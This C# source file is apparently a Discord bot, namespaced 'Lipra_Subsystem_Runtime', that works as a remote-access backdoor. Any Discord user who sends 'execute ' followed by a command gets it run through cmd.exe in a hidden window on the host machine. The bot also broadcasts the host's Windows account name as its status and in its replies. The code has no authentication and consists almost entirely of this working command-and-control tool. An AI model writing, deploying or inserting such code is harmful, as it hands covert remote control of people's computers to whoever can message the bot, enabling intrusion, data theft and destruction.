using Discord;
using Discord.WebSocket;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace Lipra_Subsystem_Runtime
{

    class Program
    {
        private readonly DiscordSocketClient _client;
        static void Main(string[] args)
            => new Program()
                .MainAsync()
                .GetAwaiter()
                .GetResult();

        public Program()
        {

            var config = new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
            };

            _client = new DiscordSocketClient(config);

            _client.Log += LogAsync;
            _client.Ready += ReadyAsync;
            _client.MessageReceived += MessageReceivedAsync;
        }

        public async Task MainAsync()
        {
            // CHANGE THIS
            string token = "YOURTOKENHERE";
            // CHANGE THIS

            await _client.LoginAsync(TokenType.Bot, token);

            await _client.StartAsync();

            await Task.Delay(Timeout.Infinite);
        }

        private Task LogAsync(LogMessage log)
        {
            Console.WriteLine(log.ToString());
            return Task.CompletedTask;
        }

        private Task ReadyAsync()
        {
            Console.WriteLine($"{_client.CurrentUser} is connected!");
            Game activity = new Game(System.Security.Principal.WindowsIdentity.GetCurrent().Name, ActivityType.Listening, ActivityProperties.Instance);
            _client.SetActivityAsync(activity);
            return Task.CompletedTask;
        }

        private async Task MessageReceivedAsync(SocketMessage message)
        {
            if (message.Author.Id == _client.CurrentUser.Id)
                return;


            if (message.Content.StartsWith("execute "))
            {
                string executecmd = message.Content.Replace("execute ", "");
                await message.Channel.SendMessageAsync("Executing: " + executecmd + " on " + System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = $"/C {executecmd}";
                process.StartInfo = startInfo;
                process.Start();
            }
        }
    }
}

